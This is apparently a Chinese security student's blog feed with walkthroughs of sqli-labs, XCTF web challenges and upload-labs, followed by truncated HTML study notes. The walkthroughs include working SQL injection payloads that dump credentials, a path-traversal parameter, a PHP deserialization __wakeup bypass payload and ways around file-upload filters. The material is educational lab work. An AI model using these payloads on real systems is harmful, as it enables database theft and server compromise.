    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>又是被迫做Noob一天@@<br>==1==先摘抄一段学习大佬内容（仅以提醒自己知识点）<br><code>mysql注入必懂的知识点 1）在mysql5.0版本以上中，存在一个自带数据库名information_schema自带 记录所有数据库名 表名 列名 2）数据库中符号“.”代表下一级，如user.user表示数据库user下的user表 3）information_schema.tables：记录所有表名信息的表 4）information_schema.columns：记录所有列名信息的表 5）table_schema：数据库名 6）table_name：表名 7）column_name：字段名 8）group_concat(table_name)：查询所有的表 9) 猜解多个数据：limit x，1 （变动x） 10）注释符：-- (后面有空格)(也就是–+) ，/**/ , payload结尾单引号闭合</code><br><a href="https://blog.csdn.net/qq_53577336/article/details/118462999">原文链接：</a></p><h1 id="less-1-‘-字符注入"><a href="#less-1-‘-字符注入" class="headerlink" title="less-1 ‘ 字符注入"></a>less-1 ‘ 字符注入</h1><p><strong>1：</strong>根据提示，判断类型<br>id=1，正常<br><code>id=1&#39;</code>错误<br><code>id=1&#39;--+</code>页面回显正确<br>把1=1改成1=2，不报错也不显示任何信息，说明可以利用 ’ 字符注入<br><strong>可以判断了</strong>：单引号字符注入<br>（==无泪==开始数据库没链接上？我说难道我的firefox和别人的不一样？^@^）<br>这里黄色字体是因为在Less-1脚本里加了个<code>echo $sql;</code><br><img src="https://img-blog.csdnimg.cn/img_convert/bafc4969bbb0d13d01468c8fe2454a2b.png" alt="image.png"><br>好的，接下来可以进行下一步<br><strong>2：</strong>order by 表中列查询<br><img src="https://img-blog.csdnimg.cn/img_convert/e1ebd8247bb84c36690867e590400256.png" alt="image.png"><br>==4==就查询不到了，应该有三列<br><strong>3：</strong>查询一下数据库的显示位（如果显示位确定，只能通过这个显示位来显示查询数据？）<br>使用union select 1,2,3联合查询语句查看<br><img src="https://img-blog.csdnimg.cn/img_convert/55d91aec3e2f64570b8a2a5bf1f1a639.png" alt="image.png"><br>说明页面有==2==个显示位<br><strong>4：</strong> 利用sql查询语句爆破出数据库内的数据库西信息<br>?id=888’ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+<br>==数据库名查询语句==<br><img src="https://img-blog.csdnimg.cn/img_convert/c570336dc34d26f37455728f87da597e.png" alt="image.png"><br><strong>5：</strong>查询security内的所有表名<br>union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=’security’)–+<br><img src="https://img-blog.csdnimg.cn/img_convert/866a1f0810c8502a5f7ab11d8f93d6ba.png" alt="image.png"><br><strong>6：</strong>爆破出列名<br>?id=’union SELECT 1,2,(select group_concat(column_name) from information_schema.columns where table_name=’users’)%23<br><img src="https://img-blog.csdnimg.cn/img_convert/1dea6fe66312f77570f142bc450bf82c.png" alt="image.png"><br><strong>7：</strong> 爆破字段内容：<code>?id=&#39;union SELECT 1,2,(select group_concat(username,0x3a,password) from users)%23</code><br><img src="https://img-blog.csdnimg.cn/img_convert/4e737b4c0e09e5fc6a79ef33340250d5.png" alt="image.png"><br>0x3a就是一个:,用16进制表示了，为了区分一下账号和密码，增加可视化</p><h1 id="less-2-GET-Error-based-intiger-based（基于错误的GET整型注入）"><a href="#less-2-GET-Error-based-intiger-based（基于错误的GET整型注入）" class="headerlink" title="less-2  GET-Error based-intiger based（基于错误的GET整型注入）"></a>less-2  GET-Error based-intiger based（基于错误的GET整型注入）</h1><p>**1:**整型数字可以直接查询，共有三个字段<img src="https://img-blog.csdnimg.cn/img_convert/dcb1e73c93167a4bdc4e0f71aad79d76.png" alt="image.png"><br>==Less1的爆破语句此处也都可以使用了==<br><strong>例子：</strong>数据库名语句查询<br><code>?id=-1 union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+</code><br><strong>注意：</strong>id要写成’0‘或负数</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f9af4f9027523805de8b5a1f1e4c5346.png" alt="image.png"></p><h1 id="Less-3-GET-Error-based-Single-quotes-with-twist-string-（基于错误的GET单引号变形字符型注入）"><a href="#Less-3-GET-Error-based-Single-quotes-with-twist-string-（基于错误的GET单引号变形字符型注入）" class="headerlink" title="Less-3  GET-Error based-Single quotes with twist-string （基于错误的GET单引号变形字符型注入）"></a>Less-3  GET-Error based-Single quotes with twist-string （基于错误的GET单引号变形字符型注入）</h1><p>输入id=1测试，页面回显正常<br>输入id=1’测试，根据报错信息分析id格式<br><img src="https://img-blog.csdnimg.cn/img_convert/92cd4abcb20db9180b3605ce2f677307.png" alt="image.png"><br>可以得知id格式为id=（‘1’），要有闭合括号和单引号</p><p><strong>数据库查名：</strong><br><code>?id=-1 union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/f518ce623835e6f8842b29a7a5e4541e.png" alt="image.png"><br>由此，由联合语句可以进行爆破了<br><code>http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;) union select 1,group_concat(username),group_concat(password) from users order by id -- a</code><br><img src="https://img-blog.csdnimg.cn/img_convert/b7ecf3afba9b7649ae4a84abe564191b.png" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="SQL" scheme="http://kannikanyun.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>Xctf--Web--Challenge--area Wp</title>
    <link href="http://kannikanyun.github.io/2022/02/18/Xctf--Web--Challenge--area%20Wp/"/>
    <id>http://kannikanyun.github.io/2022/02/18/Xctf--Web--Challenge--area%20Wp/</id>
    <published>2022-02-18T05:44:44.000Z</published>
    <updated>2022-03-24T13:50:15.267Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>@[TOC](Xctf–Web–Challenge–area Wp)</p><h2 id="1-baby-web"><a href="#1-baby-web" class="headerlink" title="1.baby_web"></a>1.baby_web</h2><p><strong>&gt; 题目描述：想想初始页面是哪个</strong><br><em>思路：</em> 先进入网页，看到url为==<a href="http://111.200.241.244:59979/1.php==">http://111.200.241.244:59979/1.php==</a><br>结合题目描述，初始页面应该是：<strong>index.php</strong>,<br>尝试修改url——&gt;失败，又跳回到1.php<br>查看源码：没有发现什么，修改为index.php再次查看源码，在network中看到了<br><img src="https://img-blog.csdnimg.cn/img_convert/df3205c31a62769fdacec89f9346c004.png" alt="image.png"></p><h3 id="其实还有第二种方法"><a href="#其实还有第二种方法" class="headerlink" title="其实还有第二种方法"></a>其实还有第二种方法</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/0ce3efe8a1f99bb14c69da56cab1bbdb.png" alt="image.png"><br>bp抓包，修改网页请求头，==sent to repeater== go一下，在响应中出现flag</p><h2 id="2-warmup"><a href="#2-warmup" class="headerlink" title="2.warmup"></a>2.warmup</h2><p>进入环境，只有一张图片，选择查看源码，发现注释<br><img src="https://img-blog.csdnimg.cn/img_convert/86b1147dac0a64d296629daf8cfd8d77.png" alt="image.png"><br>查看该php文件，出现一个<code>checkFile(&amp;$page)函数</code>，这里代码实现的功能是判断参数类型，并对参数进行多次字符串截取<a href="http://c.biancheng.net/view/7398.html">函数介绍</a>.<br>代码中还有一个<code>hint.php</code>，内容为<br> <strong>flag not here, and flag in ffffllllaaaagggg</strong><br>==source.php== 中含有文件引入语句<code>include $_REQUEST[&#39;file&#39;]</code>，<br>综合以上判断：1：需要file传参、2：checkfile返回值为true（需要将’?’经过url编码两次）、3：文件名为flag not here, and flag in ffffllllaaaagggg<br>结合几位大神的解答，得到传参值：?file=source.php%253f/../../../../ffffllllaaaagggg</p><h2 id="3-Training-WWW-Robots"><a href="#3-Training-WWW-Robots" class="headerlink" title="3.Training-WWW-Robots"></a>3.Training-WWW-Robots</h2><p>网站先列出了一串英文：<br>`In this little training challenge, you are going to learn about the Robots_exclusion_standard.<br>The robots.txt file is used by web crawlers to check if they are allowed to crawl and index your website or only parts of it.<br>Sometimes these files reveal the directory structure instead protecting the content from being crawled.</p><p>Enjoy!`</p><p>经过翻译是这样：</p><p>==在这个小小的训练挑战中，您将学习Robots_exclusion_standard。<br>txt文件被网络爬虫用来检查他们是否被允许爬行和索引你的网站或仅部分网站。<br>有时这些文件会显示目录结构，而不是保护内容不被抓取。<br>享受==<br>这里附上robors协议的一个介绍：<a href="https://developer.aliyun.com/article/277263">Robots</a></p><p>既然是robots，那先看看robots.txt文件<br>是这样的：<br>** `User-agent: *<br>Disallow: /fl0g.php<br>User-agent: Yandex<br>Disallow: ***<br>==Disallow: /fl0g.php== 表示禁止所有爬虫访问 <strong>/fl0g.php</strong>，那咱们就访问一下这个页面<br><img src="https://img-blog.csdnimg.cn/img_convert/cd21d6c9e8fb53f01b7405236205840c.png" alt="image.png"><br>其实这一题和新手区的robots是一样的<a href="https://blog.csdn.net/weixin_63957412/article/details/122672961?spm=1001.2014.3001.5502">XCTF新手区</a></p><h2 id="4-PHP2"><a href="#4-PHP2" class="headerlink" title="4.PHP2"></a>4.PHP2</h2><p>提到php，那咱们先访问<strong>index.php</strong>—–&gt;没有收获<br>此处有两个方法：<br>1：使用御剑扫描隐藏文件，出现index.phps (可以自己配置扫面类型）<br><img src="https://img-blog.csdnimg.cn/img_convert/1d9e6eef6bf5d0ea2d4c6b8b85b0acc2.png" alt="image.png"><br>2：访问index.phps == (类似于访问网站php文件源码）==</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"admin"</span><span class="token operator">===</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;p>not allowed!&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">#如果判断传参id===amdin，则退出文件</span>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#将传参进行一次url解码后判断传参id==amdin，则输出Key</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>Access granted!&lt;/p>"</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>Key: xxxxxxx &lt;/p>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>又代码可判断：==需要将id=admin进行两次url编（url执行时会自动解码一次，php代码再次解码）==<br>这里编码不能用urlencode编码工具，可以用url16进制编码工具<br>编码后，使用GET传参<br><img src="https://img-blog.csdnimg.cn/img_convert/e10222d2af861813eaee38f15cc9284c.png" alt="image.png"></p><h2 id="5-Web-php-unserialize"><a href="#5-Web-php-unserialize" class="headerlink" title="5:Web_php_unserialize"></a>5:Web_php_unserialize</h2><p>题目意思是：PHP的反序列化<br>这里粘一个：<a href="https://xz.aliyun.com/t/9234">反序列化漏洞介绍文章</a> <strong>相互学习</strong><br>先看一下页面代码：</p><pre class="line-numbers language-<?php" data-language="<?php"><code class="language-<?php">class Demo &#123;     private $file &#x3D; &#39;index.php&#39;;    public function __construct($file) &#123;         $this-&gt;file &#x3D; $file;     &#125;    function __destruct() &#123;         echo @highlight_file($this-&gt;file, true);     &#125;    function __wakeup() &#123;         if ($this-&gt;file !&#x3D; &#39;index.php&#39;) &#123;             &#x2F;&#x2F;the secret is in the fl4g.php   #反序列化漏洞运用            $this-&gt;file &#x3D; &#39;index.php&#39;;         &#125;     &#125; &#125;#以上三个事件在unserialize魔术方法中都有定义if (isset($_GET[&#39;var&#39;])) &#123;     $var &#x3D; base64_decode($_GET[&#39;var&#39;]);     if (preg_match(&#39;&#x2F;[oc]:\d+:&#x2F;i&#39;, $var)) &#123;         die(&#39;stop hacking!&#39;);     &#125; else &#123;        @unserialize($var);     &#125; &#125; else &#123;     highlight_file(&quot;index.php&quot;); &#125; ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>由以上代码可以得知：</strong><br>1：需要对<u>fl4g.php</u>进行序列化<br>2：需要绕过**__wakeup()**函数<br>因此，构造以下代码：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php class Demo &#123;     private $file &#x3D; &#39;index.php&#39;;    public function __construct($file) &#123;         $this-&gt;file &#x3D; $file;     &#125;    function __destruct() &#123;         echo @highlight_file($this-&gt;file, true);     &#125;    function __wakeup() &#123;         if ($this-&gt;file !&#x3D; &#39;index.php&#39;) &#123;             &#x2F;&#x2F;the secret is in the fl4g.php            $this-&gt;file &#x3D; &#39;index.php&#39;;         &#125;     &#125; &#125;$a&#x3D;new Demo(&#39;fl4g.php&#39;);$b&#x3D;serialize($a);&#x2F;&#x2F;得到fl4g.php的序列化对象echo $b;#O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;$b&#x3D;preg_replace(&#39;&#x2F;:4:&#x2F;&#39;,&#39;:+4:&#39;,$b);&#x2F;&#x2F;绕过正则匹配echo &#39;&lt;&#x2F;br&gt;&#39;;echo $b;$b&#x3D;preg_replace(&#39;&#x2F;:1:&#x2F;&#39;,&#39;:3:&#39;,$b);&#x2F;&#x2F;绕过魔术方法weakup（）函数echo &#39;&lt;&#x2F;br&gt;&#39;;echo $b;$b&#x3D;base64_encode($b);&#x2F;&#x2F;对处理过的对象进行base64编码echo &#39;&lt;&#x2F;br&gt;&#39;;echo &#39;&lt;&#x2F;br&gt;&#39;;echo $b;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>若在对象的魔法函数中存在的__wakeup方法，那么之后再调用 unserilize() 方法进行反序列化之前则会先调用__wakeup方法，但是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行———<a href="%5B(57%E6%9D%A1%E6%B6%88%E6%81%AF">Simba1949</a> PHP反序列化-__wakeup()方法漏洞（CVE-2016-7124）_bin789456的博客-CSDN博客](<a href="https://blog.csdn.net/bin789456/article/details/119539105">https://blog.csdn.net/bin789456/article/details/119539105</a>))</p></blockquote><p>本地执行得到payload：<code>TzorNDoiRGVtbyI6Mzp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code><br><strong>O:+4:”test”:1:{s:1:”a”;s:3:”aaa”;}<br>O:4:”test”:1:{s:1:”a”;s:3:”aaa”;} **  结果是相同的<br>其实，不光</strong>object**类型处理可以多一个’+’,其他类型也可以</p><h2 id="6-unSerialize3"><a href="#6-unSerialize3" class="headerlink" title="6:unSerialize3"></a>6:unSerialize3</h2><p>题目环境：</p><pre class="line-numbers language-class" data-language="class"><div class="caption"><span>xctf&#123;</span><a href="//类">link</a></div><code class="language-class">public $flag &#x3D; &#39;111&#39;;&#x2F;&#x2F;public定义flag变量公开可见public function __wakeup()&#123;exit(&#39;bad requests&#39;);&#125;?code&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码中定义了一个类xctf，类中引用了方法** function __wakeup() **<br>由此猜测，code所传参数是一个序列化对象，并且这个对象要绕过__wakeup() 函数传参才能成功<br>思路：<br>1.将xctf类实例化<br>2.修改实例化对象的数量值，绕过__wakeup() 函数<br><strong>步骤</strong></p><pre class="line-numbers language-none"><code class="language-none">1.序列化对象&lt;?php    class xctf&#123;        public $flag&#x3D;&#39;111&#39;;        public function __wakeup()&#123;        exit(&#39;bad requests&#39;);        &#125;        #?code&#x3D;    &#125;        #$a &#x3D; new xctf();        $a&#x3D;new xctf();        $b &#x3D; serialize($a);        echo &#39;&lt;br&gt;&#39;;        var_dump($b);        #string(36) &quot;O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;&quot;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.修改对象数量值<br>O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p><pre class="line-numbers language-引入介绍" data-language="引入介绍"><code class="language-引入介绍">O:表示序列化的事对象4:表示序列化的类名称长度xctf:表示序列化的类的名称2:表示被序列化的对象的属性个数s:属性名flag:属性值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3.urlGET传参<br>?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="http://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs摸坑历程</title>
    <link href="http://kannikanyun.github.io/2022/02/08/upload-labs%E6%91%B8%E5%9D%91%E5%8E%86%E7%A8%8B/"/>
    <id>http://kannikanyun.github.io/2022/02/08/upload-labs%E6%91%B8%E5%9D%91%E5%8E%86%E7%A8%8B/</id>
    <published>2022-02-08T05:44:44.000Z</published>
    <updated>2022-02-25T00:48:50.240Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>希望你能够快乐依旧啊！！！~</p><h2 id="pass-01-页面js绕过"><a href="#pass-01-页面js绕过" class="headerlink" title="pass-01-页面js绕过"></a>pass-01-页面js绕过</h2><p>说做题，其实是骗人的哈哈，连burp suite都还不太会用（此处省略**字查询过程，==心累哇==）</p><p>言归正传，学习记录还是要记录一下的。<br>1.提示：<br><img src="https://img-blog.csdnimg.cn/img_convert/0e498cf203125b3adfec79f4f568c4fe.png" alt="图片.png"><br>途中大致了解到：这种文件上传检测大致分为前端和后端？且检测分为白名单与黑名单。<br>此处可以尝试对数据进行抓包，但是啥也抓不到哈哈，<br>因此：判断是在前端js处进行的—–&gt;故，查看F12—&gt;查看js代码.<br><img src="https://img-blog.csdnimg.cn/img_convert/46137a645675ce6edb82f71c129debad.png" alt="图片.png"><br>有一个chickfile（）函数，其实就是判断文件类型函数，直接删去！<br><img src="https://img-blog.csdnimg.cn/img_convert/340f6aae265fed78bda8652b77289890.png" alt="图片.png">好的，pass-01通过</p><h2 id="pass-02-文件类型绕过"><a href="#pass-02-文件类型绕过" class="headerlink" title="pass-02-文件类型绕过"></a>pass-02-文件类型绕过</h2><p>pass-02第一种方法不可行了，查看提示：<br><em>本pass在服务端对数据包的MIME进行检查！</em><br>查询MIME：* web服务器使用MIME来说明发送数据的种类*<br>服务端检测可：对请求的数据MIME类型进行修改<br><strong>步骤</strong>：1：bp抓包———-&gt;2：修改类型EXE.application/octet-stream，==为==JPG.image/jpeg<br><img src="https://img-blog.csdnimg.cn/img_convert/6fbd0fcf4c4bb20cdb79ec0b623bebd0.png" alt="图片.png"><br>此处犯了个毛病（==累==）filename与content-Type都要修改才能绕过！！<br><img src="https://img-blog.csdnimg.cn/img_convert/2b2e5aae23603a16bbf607832772a02e.png" alt="图片.png"><br><strong>成功！！</strong>==！==</p><h2 id="pass-03-文件其他可解析类型绕过"><a href="#pass-03-文件其他可解析类型绕过" class="headerlink" title="pass-03-文件其他可解析类型绕过"></a>pass-03-文件其他可解析类型绕过</h2><p>先看一下直接传php<img src="https://img-blog.csdnimg.cn/img_convert/9fb3c5b2c86bb20b7891167475de372d.png" alt="图片.png"><br>应该是黑名单？<br>这里可以试试.php7/.PHP5（之前看过一个文章，貌似系统会忽略文件后缀的大小写、空格以及后缀后面还可以跟==….==,都会被略去？<br><strong>.php5</strong>成功上传==！==</p><h3 id="依旧，听首歌再溜吧！"><a href="#依旧，听首歌再溜吧！" class="headerlink" title="依旧，听首歌再溜吧！"></a>依旧，听首歌再溜吧！</h3><p><code>下方为大佬传送门</code></p><p><a href="https://www.bilibili.com/video/BV1rc411h7ZQ">请qiao这里</a>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="SQL" scheme="http://kannikanyun.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>HTML学习笔记</title>
    <link href="http://kannikanyun.github.io/2022/02/02/HTML%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://kannikanyun.github.io/2022/02/02/HTML%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2022-02-02T13:23:59.000Z</published>
    <updated>2022-02-08T14:28:26.457Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="1、html定义"><a href="#1、html定义" class="headerlink" title="1、html定义"></a>1、html定义</h3><h3 id="2-video标签"><a href="#2-video标签" class="headerlink" title="2.video标签"></a>2.video标签</h3><h3 id="3-下载资源及audio标签"><a href="#3-下载资源及audio标签" class="headerlink" title="3.下载资源及audio标签"></a>3.下载资源及audio标签</h3><h3 id="4-img标签"><a href="#4-img标签" class="headerlink" title="4.img标签"></a>4.img标签</h3><h3 id="5-标签、超链接"><a href="#5-标签、超链接" class="headerlink" title="5.标签、超链接"></a>5.标签、超链接</h3><h3 id="6：h标签"><a href="#6：h标签" class="headerlink" title="6：h标签"></a>6：h标签</h3><h3 id="7：meta标签"><a href="#7：meta标签" class="headerlink" title="7：meta标签"></a>7：meta标签</h3><h3 id="8：div标签"><a href="#8：div标签" class="headerlink" title="8：div标签:"></a>8：div标签:</h3><h3 id="9-span标签"><a href="#9-span标签" class="headerlink" title="9:span标签"></a>9:span标签</h3><h3 id="10：pre标签"><a href="#10：pre标签" class="headerlink" title="10：pre标签"></a>10：pre标签</h3><h3 id="11：p标签"><a href="#11：p标签" class="headerlink" title="11：p标签"></a>11：p标签</h3><h3 id="12：center标签"><a href="#12：center标签" class="headerlink" title="12：center标签"></a>12：center标签</h3><h3 id="13：form（形式、表格、表单）标签"><a href="#13：form（形式、表格、表单）标签" class="headerlink" title="13：form（形式、表格、表单）标签"></a>13：form（形式、表格、表单）标签</h3><h3 id="14：单选、复选、下拉、上传标签"><a href="#14：单选、复选、下拉、上传标签" class="headerlink" title="14：单选、复选、下拉、上传标签"></a>14：单选、复选、下拉、上传标签</h3><h3 id="15：u标签"><a href="#15：u标签" class="headerlink" title="15：u标签"></a>15：u标签</h3><h3 id="16：table（表格）标签"><a href="#16：table（表格）标签" class="headerlink" title="16：table（表格）标签"></a>16：table（表格）标签</h3><h3 id="17-frameset（框架页）标签"><a href="#17-frameset（框架页）标签" class="headerlink" title="17:frameset（框架页）标签"></a>17:frameset（框架页）标签</h3><h3 id="18：iframe（n-内嵌框架；内联框架）标签"><a href="#18：iframe（n-内嵌框架；内联框架）标签" class="headerlink" title="18：iframe（n. 内嵌框架；内联框架）标签"></a>18：iframe（n. 内嵌框架；内联框架）标签</h3><h3 id="19-属性"><a href="#19-属性" class="headerlink" title="19:属性"></a>19:属性</h3><h3 id="20-hr标签（横线）"><a href="#20-hr标签（横线）" class="headerlink" title="20:hr标签（横线）"></a>20:hr标签（横线）</h3><h3 id="21-html实体编码、转义、特殊符号"><a href="#21-html实体编码、转义、特殊符号" class="headerlink" title="21:html实体编码、转义、特殊符号"></a>21:html实体编码、转义、特殊符号</h3><p>1、html定义</p><p>2、HTML文档展示</p><p>代码解释：</p><p>1）<!DOCTYPE html></p><p>声明/告诉 浏览器：以下 文档/代码 为html 代码</p><p>@&lt;~~~~&gt;为开始标签   &lt;/~~~~&gt;为结束标签   </p><p>2）HTML头部<head>标签</p><p>里边定义一些元信息（描述信息的信息&lt;给浏览器看的&gt;），给浏览器/搜索引擎 看的 读者看的内容多在<body>里</p><p>3）<meta charset="utf-8"></p><p>meta表示标签，charset表示标签属性名， =   “（属性值）”</p><p>代码含义：表示浏览器在进行渲染时要用“utf-8”编码显示（因为写代码时用的编码形式为utf-8）确保不会出现乱码</p><p>4）<!--注释内容（浏览器渲染时不会显示出来）--></p><p>5）<meta keywords=“微信，即使通讯”>      标签含义：搜索引擎中的关键字</p><p>注意：</p><p>1）<html>   <head>开始结束标签是必须写的</p><p>2）代码（此时为txt文本形式）用记事本打开可能会出现乱码，此处用Notepad++打开，语言选择H—&gt;HTML(方便检查）</p><p>3.HTML展示步骤</p><p> 1）将txt后缀改为html（用浏览器打开）</p><p> 左上角为文档标题</p><p>2）查看源代码</p><p>2.video标签</p><p> 不使用flash愿意：手机发烫、安全性问题</p><p>3.下载资源及audio标签<br><audio controls><br>        <!--audio:音频--><br>        <source src="test.mp3"><br>        <!--不能加type="mp3/m4a"，否则不能播放--><br>        您的浏览器不支持audio标签<br>    </audio><br>4.img标签<br> <img src="好看1/1.png"><br>    <!--当前目录的好看1文件夹中的1.png图片--><br>    <img src="../好看1/1.png"><br>    <!--当前目录的好看1文件夹上一层文件夹中的1.png图片(每上一层多一个../)--><br>    <img src="https://img1.baidu.com/it/u=2285020071,1228316245&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=341"><br>    <!--原文件为网址链接时，若链接没有图片后缀，不用自己添加--><br>    <img src="C:\Users\13912\Desktop/hei.jpg"><br>    <!--绝对路径--><br>    <!--原图片直接复制路径（要补充图片名）则为\，如果在windows下建议用\\，或者用/代替正\--><br>    <!--<img src="C:/Users/13912/Desktop/hei.jpg">--><br>    <!--还可以加上协议：<img src="file:\\\C:\Users\13912\Desktop/hei.jpg">，file：\\表示协议名--><br>    <!--直接用html携带图片方法：图片转base64,缺点：图片不易维护、修改--><br>5.<a>标签、超链接<br> <a href="https://kannikanyun.github.io">点我跳转Kanyun’s Blog</a><br>    <!--href:超文本引用、超链接地址指向（hypertext reference<参考、引用>--><br>    <br><br>    <br><br>    <a href="https://kannikanyun.github.io" target="_blank">点我跳转Kanyun’s Blog</a><br>    &lt;!–<br>        arget的所有取值以及它们的含义：</p><pre><code>    _blank：在新窗口中打开；    _self：默认。在相同的框架中打开；    _parent：在父框架集中打开；    _top：在整个窗口中打开；    --&gt;&lt;br&gt;&lt;br&gt;&lt;a href=&quot;C:\Users\13912\Desktop\html学习\笔记文件\target測試\白.html&quot;&gt;点我跳转白.html&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;a href=&quot;C:\Users\13912\Desktop\html学习\笔记文件\target測試\白.html&quot; target=&quot;_blank&quot;&gt;点我跳转白.html&lt;/a&gt;&lt;!--使用时注意路径选择--&gt;&lt;!----&gt;&lt;br&gt;&lt;br&gt;&lt;a href=&quot;mailto:1391205637@qq.com&quot;&gt;点我弹出邮箱客户端发送邮件&lt;/a&gt;&lt;!--mailto后可以写更多参数--&gt;&lt;br&gt;&lt;br&gt;&lt;a href=&quot;javascript:alert(&#39;别灰心&#39;)&quot;&gt;点我试试看&lt;/a&gt;&lt;!--在javascript中，alert的用法是“alert(在对话框中显示的纯文本)”。--&gt;&lt;br&gt;&lt;br&gt;&lt;!----&gt;&lt;!--锚标记--&gt;&lt;a href=&quot;#标记&quot;&gt;点我&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;div id=&quot;标记1&quot;&gt;定位到这里1&lt;/div&gt;&lt;!--    在网址后跟  #标记  ，则自动定位到该标记所在位置--&gt;&lt;br&gt;&lt;br&gt;&lt;div id=&quot;标记&quot; style=&quot;position: absolute; top: 